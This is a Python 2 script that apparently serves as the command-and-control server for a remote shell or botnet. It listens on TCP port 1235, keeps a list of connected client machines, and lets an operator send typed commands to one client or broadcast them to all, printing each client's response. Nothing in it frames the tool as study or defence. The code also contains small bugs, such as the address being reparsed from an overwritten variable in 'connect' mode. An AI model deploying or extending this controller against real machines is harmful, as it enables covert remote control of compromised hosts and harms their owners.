#-*- coding: UTF-8 -*-
import os
import socket
from threading import Thread

def accept():
    while flag:
        try:
            client, address = server.accept()
            client_list[str(address).strip()] = client
        except:
            pass

def display():
    print ('Current Clients: ')

    if not client_list:
        print ('Empty!')

    for address in client_list:
        print ('-> [{}]'.format(str(address).strip()))


def manage_all(command):

    for address in client_list:
        thread = Thread(target=manage, args=(address, command))
        thread.start()        # manage(client_list[address], command)


def manage(address, command):
    client = client_list[address]
    client.send(command)
    print ('[{}] << {}'.format(address, command))

    response = client.recv(1024).decode('utf-8')
    print ('[{}] >> {}'.format(address, response))


server = socket.socket(
    family=socket.AF_INET,      # internet ipv4
    type=socket.SOCK_STREAM)    # TCP
                                # UDP: socket.SOCK_DGRAM
server.bind(('', 1235))
server.listen(1024)


flag = True
client_list = {}

for i in range(5):
    thread = Thread(target=accept)
    thread.start()

while True:
    try:
        command = raw_input('>>> ').lower()       # python3 -> input()

        if command == 'exit':
            break

        elif command == 'display':
            display()

        elif command.startswith('connect'):
            while True:
                address = command.split(' ', 1)[1]
                command = raw_input('[{}]$ '.format(address))

                if command.lower() == 'exit':
                    break

                thread = Thread(target=manage, args=(address, command))
                thread.start()

        elif command.startswith('all'):
            command = command.split(' ', 1)[1]
            manage_all(command)

        elif command == 'clear':
            if os.name == 'nt':
                os.system('cls')

            elif os.name == 'posix':
                os.system('clear')

    except Exception as e:
        print e

print ('Exitting')
flag = False
server.settimeout(1)
server.close()
